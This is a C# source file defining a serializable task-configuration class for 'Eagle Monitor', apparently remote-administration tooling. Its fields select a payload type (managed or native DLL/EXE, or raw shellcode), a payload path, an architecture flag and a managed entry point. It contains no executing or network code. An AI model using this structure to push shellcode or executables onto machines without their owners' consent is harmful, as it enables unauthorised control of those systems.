using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_Tasks_Configurator
{
    [Serializable]
    public class ExectionTasks : ITasks
    {
        public enum PayloadType : ushort
        {
            MANAGED_DLL = 0,
            MANAGED_EXE = 1,
            NATIVE_DLL = 2,
            NATIVE_EXE = 3,
            SHELLCODE = 4
        }

        /*public ExectionTasks(PayloadType payloadType = PayloadType.SHELLCODE, string payloadPath = "", bool is64Bit = false) 
        {
            this.payloadType = payloadType;
            this.payloadPath = payloadPath;
            this.is64Bit = is64Bit;
        }*/

        public PayloadType payloadType { get; set; }
        public string payloadPath { get; set; }
        public bool is64Bit { get; set; }
        public string entryPointForManagedDlls { get; set; }

        public string name { get; set; }
        public string description { get; set; }
        public TaskType taskType { get; set; }
    }
}
